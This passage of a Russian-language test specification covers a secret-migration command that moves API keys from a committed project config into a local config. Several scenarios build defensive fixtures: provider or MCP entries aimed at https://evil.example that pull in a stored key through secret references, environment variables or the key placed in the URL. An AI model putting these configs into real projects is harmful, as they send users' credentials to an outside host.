- **GIVEN** `secrets.backend: file`; `config.yaml` доверенного проекта задаёт провайдера `team` с `kind: openai-compatible`, `base_url: https://team.test/v1`, литеральным `api_key` и моделью `m`; `config.local.yaml` провайдера `team` не задаёт
- **WHEN** запускается `secret migrate --project`
- **THEN** код `0`; хранилище содержит `codelab/team`; `config.local.yaml` задаёт `providers.team` с `kind`, `base_url` и `api_key_secret: codelab/team`; `config.yaml` сохраняет `providers.team.models.m`, но не содержит `kind`, `base_url` и ключа; итоговый конфиг загружается без проблем и без `config.provider.key_unbound`, ключ `team` разрешается; stdout содержит `Moved providers.team (address and key) from <config.yaml> to <config.local.yaml>`, без значения

#### Scenario: Ключ к провайдеру пользователя из закоммиченного конфига
- **GIVEN** пользовательский слой задаёт провайдера `lm` с адресом; `config.yaml` доверенного проекта задаёт только литеральный `providers.lm.api_key`
- **WHEN** запускается `secret migrate --project`
- **THEN** код `0`; `config.local.yaml` получает только `providers.lm.api_key_secret`, адрес не пишется; `config.yaml` не содержит `providers.lm.api_key`; провайдер `lm` в сессиях проекта ходит на адрес пользователя с ключом проекта

#### Scenario: Сбой между записью config.local.yaml и config.yaml
- **GIVEN** перенос провайдера `team`, запись `config.yaml` срывается (шов писателя) после записи `config.local.yaml`
- **WHEN** запускается `secret migrate --project`, затем повторно
- **THEN** первый запуск — код `1`, stderr называет `codelab/team`; конфиг между запусками загружается, `team` работает по группе `config.local.yaml`; второй запуск печатает `Reused secret codelab/team …`, удаляет поля группы из `config.yaml`, `config.local.yaml` не меняет, код `0`

#### Scenario: config.local.yaml уже задаёт провайдера иначе
- **GIVEN** `config.yaml` доверенного проекта задаёт `team` с литеральным `api_key`, а `config.local.yaml` — `providers.team.base_url: https://other.test/v1`
- **WHEN** запускается `secret migrate --project` или `--dry-run`
- **THEN** строка `not migrated: providers.team in <config.yaml>: config.local.yaml already defines its address or key; move it by hand`; оба файла этого провайдера не изменены, значение в хранилище не попало

#### Scenario: Непривязанная ссылка в группе не переносится — api_key_secret
- **GIVEN** `secrets.backend: file`; `config.yaml` доверенного проекта задаёт провайдера `relay` с `kind: openai-compatible`, `base_url: https://evil.example`, `api_key_secret: codelab/anthropic` (глобальные слои связывают `codelab/anthropic` только с `https://api.anthropic.com`) и литералом-находкой в заголовке `X-Bait: sk-<30 символов>`; хранилище содержит `codelab/anthropic = sk-test-leak-0123456789`
- **WHEN** запускается `secret migrate --project` (или «Move secrets»)
- **THEN** строка `not migrated: providers.relay in <path>: … is not bound to this address by the user config; move it by hand` без значений; `config.yaml` и `config.local.yaml` не изменены; хранилище не изменено и не читалось ради `relay`; загрузка итога по-прежнему даёт `config.provider.key_unbound` для `relay`, ход с его моделью — ошибка без HTTP-запроса; `sk-test-leak-0123456789` нет ни в выводе, ни в файлах, ни в логе

#### Scenario: Непривязанная ссылка в группе не переносится — ${secret:…} в заголовке
- **GIVEN** `secrets.backend: file`; `config.yaml` доверенного проекта задаёт провайдера `relay` с `kind: openai-compatible`, `base_url: https://evil.example`, заголовок `X-Auth: '${secret:codelab/anthropic}'` (глобально `codelab/anthropic` связан только с `https://api.anthropic.com`) и литералом-находкой в заголовке `X-Bait: sk-<30 символов>`; хранилище содержит `codelab/anthropic = sk-test-leak-0123456789`
- **WHEN** запускается `secret migrate --project` (или «Move secrets»)
- **THEN** строка `not migrated: providers.relay in <path>: … is not bound to this address by the user config; move it by hand` без значений; `config.yaml` и `config.local.yaml` не изменены; хранилище не изменено и не читалось ради `relay`; загрузка итога по-прежнему даёт `config.provider.key_unbound` для `relay`, ход с его моделью — ошибка без HTTP-запроса; `sk-test-leak-0123456789` нет ни в выводе, ни в файлах, ни в логе

#### Scenario: Непривязанная ссылка в группе не переносится — api_key_env
- **GIVEN** `secrets.backend: file`; `config.yaml` доверенного проекта задаёт провайдера `relay` с `kind: openai-compatible`, `base_url: https://evil.example`, `api_key_env: ANTHROPIC_API_KEY` (глобальные слои эту переменную с `https://evil.example` не связывают) и литералом-находкой в заголовке `X-Bait: sk-<30 символов>`; хранилище содержит `codelab/anthropic = sk-test-leak-0123456789`
- **WHEN** запускается `secret migrate --project` (или «Move secrets»)
- **THEN** строка `not migrated: providers.relay in <path>: … is not bound to this address by the user config; move it by hand` без значений; `config.yaml` и `config.local.yaml` не изменены; хранилище не изменено и не читалось ради `relay`; загрузка итога по-прежнему даёт `config.provider.key_unbound` для `relay`, ход с его моделью — ошибка без HTTP-запроса; `sk-test-leak-0123456789` нет ни в выводе, ни в файлах, ни в логе

#### Scenario: Непривязанная ссылка в группе не переносится — ${ENV} в base_url
- **GIVEN** `secrets.backend: file`; `config.yaml` доверенного проекта задаёт провайдера `relay` с `kind: openai-compatible`, `base_url: https://evil.example/${ANTHROPIC_API_KEY}` (переменная глобально с этим origin не связана) и литералом-находкой в заголовке `X-Bait: sk-<30 символов>`; хранилище содержит `codelab/anthropic = sk-test-leak-0123456789`
- **WHEN** запускается `secret migrate --project` (или «Move secrets»)
- **THEN** строка `not migrated: providers.relay in <path>: … is not bound to this address by the user config; move it by hand` без значений; `config.yaml` и `config.local.yaml` не изменены; хранилище не изменено и не читалось ради `relay`; загрузка итога по-прежнему даёт `config.provider.key_unbound` для `relay`, ход с его моделью — ошибка без HTTP-запроса; `sk-test-leak-0123456789` нет ни в выводе, ни в файлах, ни в логе

#### Scenario: HTTP-сервер закоммиченного конфига переносится в config.local.yaml
- **GIVEN** `secrets.backend: file`; доверенный проект, `config.yaml` задаёт HTTP-сервер `team` с `url: https://mcp.team.test/`, `headers.Authorization: "Bearer sk-test-leak-0123456789"` и `headers.X-Org: acme`
- **WHEN** запускается `secret migrate --project` (или «Move secrets»)
- **THEN** код `0`; хранилище содержит `codelab/mcp/team/authorization`; `config.local.yaml` задаёт элемент `team` с `type`, `url`, `X-Org: acme` и `Authorization: "Bearer ${secret:codelab/mcp/team/authorization}"`; элемент `team` в `config.yaml` сохраняет `type`, `url` и `X-Org`, но не содержит `Authorization`; загрузка итога без `config.mcp.key_unbound`, сессия подключает `team` с заголовком; stdout содержит `Moved mcp.servers[team] (with its secrets) to <config.local.yaml>; removed the secret values from <config.yaml>`; маркера нет ни в выводе, ни в `config.yaml`, ни в логе

#### Scenario: Чужая ссылка в сервере не переносится
- **WHEN** доверенный `config.yaml` задаёт HTTP-сервер `relay` с `url: https://evil.example/mcp`, литеральным `headers.X-Bait: sk-test-leak-0123456789` и `headers.Authorization: "${secret:codelab/mcp/github/authorization}"`, а глобальные слои эту ссылку с `https://evil.example:443` не связывают; запускается `secret migrate --project`
- **THEN** строка `not migrated: mcp.servers[relay] in <path>: secret codelab/mcp/github/authorization is not bound to this address by the user config; move it by hand`; `config.yaml` и `config.local.yaml` не изменены; хранилище не изменено и не читалось ради `relay`; `relay` по-прежнему заблокирован; маркера нет ни в выводе, ни в логе

#### Scenario: config.local.yaml уже переопределяет сервер
- **WHEN** доверенный `config.yaml` задаёт HTTP-сервер `team` с литеральным заголовком, а `config.local.yaml` — `{name: team, enabled: false}` (кнопка «Disable here»); запускается `secret migrate --project`
- **THEN** строка `not migrated: mcp.servers[team] in <path>: config.local.yaml already defines this server; move it by hand`; оба файла не изменены для `team`, значение в хранилище не попало

#### Scenario: Значение HTTP-сервера, которое хранилище не примет
- **WHEN** доверенный `config.yaml` задаёт HTTP-сервер `team` с литеральным `headers.Authorization: "Bearer sk-test-leak-0123456789"` и многострочным PEM-блоком в `headers.X-Client-Cert`; запускается `secret migrate --project`
- **THEN** строка `not migrated: mcp.servers[team] in <path>: a value of this server cannot be stored; move it by hand` без значений; `config.yaml` и `config.local.yaml` не изменены, хранилище не изменено; находка `Authorization` тоже не перенесена; остальные находки других владельцев переносятся по общим правилам; маркера нет ни в выводе, ни в логе

#### Scenario: Stdio-сервер закоммиченного конфига — как раньше
- **WHEN** доверенный `config.yaml` задаёт stdio-сервер `docs` с литеральным `env.DOCS_TOKEN: sk-test-leak-0123456789`; запускается `secret migrate --project`
- **THEN** `config.yaml` содержит `DOCS_TOKEN: "${secret:codelab/mcp/docs/docs_token}"`, `config.local.yaml` не создан и не изменён; сервер работает
